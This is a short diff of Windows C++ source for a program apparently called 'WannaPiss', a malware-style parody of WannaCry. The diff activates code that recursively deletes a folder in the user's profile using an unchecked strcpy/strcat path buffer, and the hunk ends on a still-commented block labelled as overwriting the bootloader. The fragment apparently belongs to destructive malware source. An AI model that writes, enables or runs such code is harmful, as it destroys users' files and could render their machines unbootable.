@@ -205,14 +205,12 @@ const size_t code2_len = sizeof(code2);
 
 int WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 	// Delete everyting in ~/WannaPiss
-	/*
 	const char* homeDirectory = getenv("USERPROFILE");
 	char wpPath[256];
 	strcpy(wpPath, homeDirectory);
 	strcat(wpPath, "\\WannaPiss\\");
 
 	std::filesystem::remove_all(wpPath); // Deletes one or more files recursively.
-	*/
 
 	/*
 	// Overwrie bootloader
